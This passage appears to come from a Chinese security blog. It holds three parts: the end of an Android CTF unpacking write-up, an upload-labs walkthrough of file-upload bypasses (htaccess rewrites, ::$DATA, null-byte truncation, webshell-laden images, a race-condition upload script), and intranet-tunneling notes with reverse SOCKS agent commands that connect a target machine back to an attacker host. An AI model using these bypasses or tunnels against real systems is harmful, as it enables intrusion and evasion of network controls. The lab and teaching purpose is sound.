<p>在模拟器上分别打开SuperSU和Xposed Installer进行安装</p>
<blockquote>
<p>安装SuperSU时不要选择更新，不然会卡死在开机页面，需要重新root</p>
<p>安装Xposed Installer后授权重启即可</p>
<p>关闭模拟器时直接x掉就好，千万不要选power off，不然需要重新root</p>
<p>重启使用adb reboot</p>
</blockquote>
<h3 id="安装ApkShelling"><a href="#安装ApkShelling" class="headerlink" title="安装ApkShelling"></a>安装ApkShelling</h3><blockquote>
<p>AplShelling下载地址：<a href="https://github.com/OakChen/ApkShelling">https://github.com/OakChen/ApkShelling</a></p>
</blockquote>
<p>Android Studio打开ApkShelling，修改XposedEntry.java的targetPackages值，加入需要脱壳的包名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] targetPackages =</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;com.example.how_debug&quot;</span>, <span class="string">&quot;com.sfysoft.shellingtest2&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>launch option改为nothing</p>
</blockquote>
<p>安装完后重启，然后上传题目的apk，再拉取题目的dex</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">adb shell <span class="built_in">ls</span> /<span class="keyword">data</span>/<span class="keyword">data</span>/com.example.how_debug</span><br><span class="line">adb pull /<span class="keyword">data</span>/<span class="keyword">data</span>/com.example.how_debug/<span class="number">00125</span><span class="literal">-02</span>.dex ./</span><br></pre></td></tr></table></figure>

<p>jadx直接打开dex搜索flag</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021032017503e57ecc42afcf9a2e56f.png" alt="image-20210320174944804" style="zoom: 80%;" />

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/lostnerv/article/details/106061517">Reverse 解法2：bang Writeup（安卓简单的加壳）（2020网鼎杯青龙组）</a></p>
<p><a href="https://juejin.cn/post/6844903840026722311">搞机：AS自带模拟器AVD Root 和 Xposed安装</a></p>
]]></content>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2020/02/28/upload-labs/</url>
    <content><![CDATA[<blockquote>
<p>之前的一些关于 upload-labs 的练习</p>
</blockquote>
<span id="more"></span>

<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>修改后缀名</p>
<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>Content-type 改为 image&#x2F;gif</p>
<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><ol>
<li><p>改后缀名  <code>php2, php3, php4, php5, phps, pht, phtm, phtml</code></p>
</li>
<li><p>重写文件解析规则绕过。上传先上传一个名为<code>.htaccess</code>文件，内容如下：</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;03.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>然后再上传一个<code>03.jpg</code></p>
<p>执行上传的<code>03.jpg</code>脚本</p>
<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>查看源代码 发现黑名单几乎过滤了全部的违法后缀名 ，<strong>但少过滤了 .htaccess 后缀</strong></p>
<ol>
<li>上传一个.htaccess 文件 重写 服务器的文件解析</li>
</ol>
<p>创建一个 .htaccess 文件</p>
<p>内容可以是 : AddType application&#x2F;x-httpd-php .jpg,可将jpg文件解析为php文件.</p>
<p>或者是 : SetHandler application&#x2F;x-httpd-php,可将其他所有文件解析为php文件.</p>
<ol start="2">
<li>利用PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等性：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">双引号&quot;     =   点号.</span><br><span class="line">大于符号&gt;   =   问号?</span><br><span class="line">小于符号&lt;   =   星号*</span><br></pre></td></tr></table></figure>

<p>先把4.php文件后缀改为4.jpg  然后用bs 将文件名改为 4.php:.jpg，上传成功后会生成4.php的空文件，大小为0KB.</p>
<p>然后再在bs 中把文件名 改为4.&lt;或4.&lt;&lt;&lt;或4.&gt;&gt;&gt;或4.&gt;&gt;&lt;后再次上传，重写4.php文件内容，Webshell代码就会写入原来的4.php空文件中。</p>
<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>查看源代码发现 黑名单里加上了 .htaccess 后缀 ，但是没有 进行大小写过滤</p>
<p>与 Pass-04 一样</p>
<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>在 pass-05 的基础上加上了大小写过滤， 但发现去掉了收尾去空</p>
<p>查了一下：<code>trim()</code>函数 : <code>移除字符串两侧的空白字符或其他预定义字符</code>.</p>
<p>Win下<code>xx.jpg[空格] 或xx.jpg.</code>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点**</p>
<p>用 bs 在1.php 后缀名后面加一个空格成功绕过</p>
<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>没有删除文件后缀名的点</p>
<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>查看源代码后发现 黑名单过滤 没有去字符串 ::$DATA </p>
<p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。<br>上传<code>.php::$DATA</code>绕过。(仅限windows)  上传后 自动保存为 1.php</p>
<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><strong>原理同Pass-06</strong>，上传文件名后加上<strong>点+空格+点</strong>，改为<code>09.php. .</code></p>
<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>双写文件名绕过，文件名改成<code>10.pphphp</code></p>
<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>上传路径名%00截断绕过。上传的文件名写成<code>11.jpg</code>, save_path改成<code>../upload/11.php%00</code>，最后保存下来的文件就是<code>11.php</code></p>
<p>但这东西有点过气了，因为需要两个条件</p>
<ol>
<li>php版本小于5.3.4</li>
<li>php的<strong>magic_quotes_gpc</strong>为OFF状态</li>
</ol>
<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>php.ini设置 <code>magic_quotes_gpc = Off</code></p>
<p>POST 不能解析 url 编码，所以可以用 0x00</p>
<p>原理同<strong>Pass-11</strong>，上传路径0x00绕过。利用Burpsuite的Hex功能将save_path改成<code>../upload/12.php【二进制00】</code>形式</p>
<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>代码通过读取上传文件的<strong>前两字节判断是否为图片</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin); </span><br></pre></td></tr></table></figure>

<p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。</p>
<p>使用命令<code>copy normal.jpg /b + shell.php /a webshell.jpg</code>，将php一句话追加到jpg图片末尾，代码不全的话，人工补充完整。形成一个包含Webshell代码的新jpg图片，然后直接上传即可。<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.jpg">JPG一句话shell参考示例</a></p>
<p>png图片处理方式同上。<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.png">PNG一句话shell参考示例</a></p>
<h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><code>getimagesize</code>通过检查图像文件的大小并返回图像的尺寸以及文件类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list($width, $height, $type, $attr) = getimagesize(&quot;runoob-logo.png&quot;);</span><br></pre></td></tr></table></figure>

<p><code>image_type_to_extension</code>根据指定的图像类型返回对应的后缀名</p>
<p>原理和示例同<strong>Pass-13</strong>，添加GIF图片的文件头绕过检查</p>
<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$image_type = exif_imagetype($filename);</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Irving\AppData\Roaming\Typora\typora-user-images\1564977362026.png" alt="1564977362026"></p>
<p>原理同<strong>Pass-13</strong>，添加GIF图片的文件头绕过检查</p>
<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</p>
<p>这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromgif-pass-00.gif">示例</a>。</p>
<p>打开被渲染后的图片，Webshell代码仍然存在。</p>
<p>提供一个jpg格式图片绕过imagecreatefromjpeg函数渲染的一个<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromjpeg-pass-LandGrey.jpg">示例文件</a>。 直接上传示例文件会触发Warning警告，并提示文件不是jpg格式的图片。但是实际上已经上传成功，而且示例文件名没有改变。</p>
<p>从上面上传jpg图片可以看到我们想复杂了，程序没有对渲染异常进行处理，直接在正常png图片内插入webshell代码，然后上传<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefrompng-pass-LandGrey.png">示例文件</a>即可，并不需要图片是正常的图片。</p>
<p>程序依然没有对文件重命名，携带webshell的无效损坏png图片直接被上传成功。</p>
<h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>条件竞争</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># Build By LandGrey</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">lists</span>):</span><br><span class="line">    hh = hackhttp.hackhttp()</span><br><span class="line">    raw = <span class="string">&quot;&quot;&quot;POST /upload-labs/Pass-17/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8089</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Referer: http://localhost:8089/upload-labs/Pass-17/index.php</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------287032381131322</span></span><br><span class="line"><span class="string">Content-Length: 334</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------287032381131322</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"> phpinfo();</span></span><br><span class="line"><span class="string"> ?&gt;</span></span><br><span class="line"><span class="string">-----------------------------287032381131322</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä¸ä¼ </span></span><br><span class="line"><span class="string">-----------------------------287032381131322--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    code, head, html, redirect, log = hh.http(<span class="string">&#x27;http://localhost:8089/upload-labs/Pass-17/index.php&#x27;</span>, raw=raw)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(code) + <span class="string">&quot;\r&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">10</span>)</span><br><span class="line">pool.<span class="built_in">map</span>(upload, <span class="built_in">range</span>(<span class="number">10000</span>))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PRACTICE</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透</title>
    <url>/2021/05/12/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<blockquote>
<p>记录内网穿透的一些知识</p>
</blockquote>
<span id="more"></span>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>内网穿透</strong></p>
<p>利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。</p>
<p><strong>隧道技术</strong></p>
<p>隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。</p>
<p><strong>隧道分类</strong></p>
<ul>
<li>网络层隧道：ICMP等</li>
<li>传输层隧道：TCP、UDP等</li>
<li>应用层隧道：HTTP、DNS、SSH、RDP等</li>
</ul>
<p><strong>实战环境</strong></p>
<p>在实战环境中，我们要考虑目标机器的出入网情况，有可能只允许ICMP出入网，抑或是只允许HTTP出网，我们需要视特定情况选择对应的隧道，选择反弹shell、代理或者端口转发，选择正向代理或者反向代理等等。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>目标机器：</p>
<ul>
<li>Win7</li>
<li>192.168.22.3（内）</li>
<li>192.168.33.4（外）</li>
</ul>
<p>攻击机器：</p>
<ul>
<li>Linux</li>
<li>192.168.44.5（外）</li>
</ul>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><blockquote>
<p><a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></p>
<p>能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用</p>
</blockquote>
<h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><blockquote>
<p><a href="https://github.com/DhavalKapil/icmptunnel">https://github.com/DhavalKapil/icmptunnel</a></p>
<p>创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用</p>
</blockquote>
<h3 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h3><blockquote>
<p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
<p>tcp、udp、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用</p>
</blockquote>
<p>攻击机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">(可选)关闭系统默认的 ping</span></span><br><span class="line">echo 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line">./pingtunnel -type server -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>

<p>目标机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">转发TCP</span></span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:9999 -s server_ip -t server_ip:7777 -tcp 1 -noprint 1 -nolog 1</span><br><span class="line"><span class="meta"># </span><span class="language-bash">转发sock5</span></span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:9999 -s server_ip -tcp 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>

<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><blockquote>
<p><a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
<p>网络工具中的瑞士军刀，不多介绍，linux系统一般自带</p>
</blockquote>
<h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h3><blockquote>
<p><a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
<p>powershell版的netcat</p>
</blockquote>
<h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><blockquote>
<p><a href="https://github.com/3ndG4me/socat">https://github.com/3ndG4me/socat</a></p>
<p>具有记录转发流的功能，方便查看转发内容，需要安装</p>
</blockquote>
<h3 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h3><blockquote>
<p>windows系统自带的网络配置工具</p>
</blockquote>
<h3 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h3><blockquote>
<p><a href="https://github.com/windworst/LCX">https://github.com/windworst/LCX</a></p>
<p>端口转发工具</p>
</blockquote>
<h3 id="NATBypass"><a href="#NATBypass" class="headerlink" title="NATBypass"></a>NATBypass</h3><blockquote>
<p><a href="https://github.com/cw1997/NATBypass">https://github.com/cw1997/NATBypass</a></p>
<p>一款lcx在golang下的实现，更好的跨平台，更完善的文档</p>
</blockquote>
<h3 id="iox"><a href="#iox" class="headerlink" title="iox"></a>iox</h3><blockquote>
<p><a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p>
<p>端口转发 &amp; 内网代理工具，功能类似于lcx&#x2F;ew，简化了命令行参数，支持UDP流量转发，更好的跨平台。</p>
<p>缺点：不支持监听指定IP，默认监听0.0.0.0:port，会增大暴露风险</p>
</blockquote>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h3><blockquote>
<p><a href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a></p>
<p>十分方便的多级SOCKS代理，已经永久停止更新</p>
</blockquote>
<p><strong>正向连接</strong></p>
<p>目标机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 888</span><br></pre></td></tr></table></figure>

<p><strong>反向连接</strong></p>
<p>攻击机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 1234</span><br></pre></td></tr></table></figure>

<p>目标机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ew_for_Win.exe -s rssocks -d 192.168.44.5 -e 1234</span><br></pre></td></tr></table></figure>

<h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><blockquote>
<p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
<p>重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃</p>
</blockquote>
<p>攻击机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python neoreg.py generate -k 123456</span><br></pre></td></tr></table></figure>

<p>上传对应的<code>tunnel.(aspx|ashx|jsp|php)</code>文件到目标机上</p>
<p>攻击机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 neoreg.py -k 123456 -u http://192.168.33.4/tunnel.php</span><br></pre></td></tr></table></figure>

<h3 id="venom"><a href="#venom" class="headerlink" title="venom"></a>venom</h3><blockquote>
<p><a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p>
<p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具</p>
</blockquote>
<p>攻击机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure>

<p>目标机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">agent.exe -rhost 192.168.44.5 -rport 9999</span><br></pre></td></tr></table></figure>

<p>攻击机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">show</span><br><span class="line">goto 1</span><br><span class="line">socks 6666</span><br></pre></td></tr></table></figure>

<h3 id="ssf"><a href="#ssf" class="headerlink" title="ssf"></a>ssf</h3><blockquote>
<p><a href="https://github.com/securesocketfunneling/ssf">https://github.com/securesocketfunneling/ssf</a></p>
<p>支持TLS隧道</p>
</blockquote>
<p><strong>正向连接</strong></p>
<p>把certs文件夹和ssfd上传到目标机上</p>
<p>目标机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssfd.exe ‐p 1333</span><br></pre></td></tr></table></figure>

<p>攻击机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./ssfd ‐D 1222 ‐p 1333 192.168.33.4</span><br></pre></td></tr></table></figure>

<p><strong>反向连接</strong></p>
<p>攻击机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./ssfd ‐p 1234</span><br></pre></td></tr></table></figure>

<p>目标机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssf.exe ‐F 12345 ‐p 1234 192.168.44.5</span><br></pre></td></tr></table></figure>

<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><blockquote>
<p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
<p>支持 TCP、UDP、HTTP、HTTPS 等多种协议</p>
</blockquote>
<p>攻击机上配置frps.ini</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 6666</span><br></pre></td></tr></table></figure>

<p>攻击机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>

<p>目标及配置frpc.ini</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.33.4</span><br><span class="line">server_port = 6666</span><br><span class="line">[http_proxy]</span><br><span class="line">type=tcp</span><br><span class="line">remote_port=7777</span><br><span class="line">plugin=socks5</span><br></pre></td></tr></table></figure>

<p>目标机上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>

<h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><blockquote>
<p><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>
<p>可支持任何tcp、udp上层协议，还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端</p>
</blockquote>
<h3 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h3><blockquote>
<p><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p>
<p>不仅可以创建DNS隧道，更是C2</p>
</blockquote>
<h3 id="dnscat2-powershell"><a href="#dnscat2-powershell" class="headerlink" title="dnscat2-powershell"></a>dnscat2-powershell</h3><blockquote>
<p><a href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p>
<p>dnscat2的powershell客户端</p>
</blockquote>
<h3 id="dns2tcp"><a href="#dns2tcp" class="headerlink" title="dns2tcp"></a>dns2tcp</h3><blockquote>
<p><a href="https://github.com/alex-sector/dns2tcp">https://github.com/alex-sector/dns2tcp</a></p>
<p>TCP over DNS，即通过DNS隧道转发TCP连接</p>
</blockquote>
<h3 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h3><blockquote>
<p><a href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></p>
<p>IPv4 over DNS，即通过DNS隧道转发IPv4数据包</p>
</blockquote>
<h3 id="reDuh"><a href="#reDuh" class="headerlink" title="reDuh"></a>reDuh</h3><blockquote>
<p><a href="https://github.com/sensepost/reDuh">https://github.com/sensepost/reDuh</a></p>
<p>TCP over HTTP，即通过HTTP隧道转发TCP连接，隧道不稳定</p>
</blockquote>
<h3 id="Tunna"><a href="#Tunna" class="headerlink" title="Tunna"></a>Tunna</h3><blockquote>
<p><a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a></p>
<p>TCP、SOCKS over HTTP，即通过HTTP隧道转发TCP连接和SOCKS，隧道不稳定</p>
</blockquote>
<h3 id="ABPTTS"><a href="#ABPTTS" class="headerlink" title="ABPTTS"></a>ABPTTS</h3><blockquote>
<p><a href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></p>
<p>TCP over HTTP，即通过HTTP隧道转发TCP连接，数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp</p>
</blockquote>
<h3 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a>Termite</h3><blockquote>
<p><a href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a></p>
<p>EarthWorm的升级版，已经永久停止更新</p>
</blockquote>
<h3 id="ssocks"><a href="#ssocks" class="headerlink" title="ssocks"></a>ssocks</h3><blockquote>
<p><a href="https://github.com/54Pany/sSocks">https://github.com/54Pany/sSocks</a></p>
<p>正向和反向的socks工具，可执行文件的大小很小</p>
</blockquote>
<h3 id="s5-go"><a href="#s5-go" class="headerlink" title="s5.go"></a>s5.go</h3><blockquote>
<p><a href="https://github.com/ring04h/s5.go">https://github.com/ring04h/s5.go</a></p>
<p>go语言编写的socks服务工具，良好的跨平台特性</p>
</blockquote>
<h3 id="bridge"><a href="#bridge" class="headerlink" title="bridge"></a>bridge</h3><blockquote>
<p><a href="https://github.com/luizluca/bridge">https://github.com/luizluca/bridge</a></p>
<p>基于http协议的端口转发</p>
</blockquote>
<h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><blockquote>
<p>这里分享个小技巧，如果已经连上了ssh，可以输入~C来执行ssh命令</p>
</blockquote>
<p>本地端口转发：</p>
<blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-L 本地网卡地址:本地端口:目标地址:目标端口</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -CNfg -L 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line"><span class="meta"># </span><span class="language-bash">或者省略本地网卡地址</span></span><br><span class="line">ssh -CNfg -L 7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ssh客户端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到114.114.114.114:9999</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">即本地机器的127.0.0.1:7777可以通过192.168.1.1的ssh隧道访问远程的114.114.114.114:9999</span></span><br></pre></td></tr></table></figure>

<p>远程端口转发：</p>
<blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-R 远程网卡地址:远程端口:目标地址:目标端口</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -CNfg -R 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line"><span class="meta"># </span><span class="language-bash">或者省略远程网卡地址</span></span><br><span class="line">ssh -CNfg -R 7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ssh服务端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh客户端，再由ssh客户端转发到114.114.114.114:9999</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">即远程机器的127.0.0.1:7777可以通过192.168.1.1的ssh隧道访问本地的114.114.114.114:9999</span></span><br></pre></td></tr></table></figure>

<p>动态端口转发：</p>
<blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-D 本地网卡地址:本地端口</span><br></pre></td></tr></table></figure>
</blockquote>
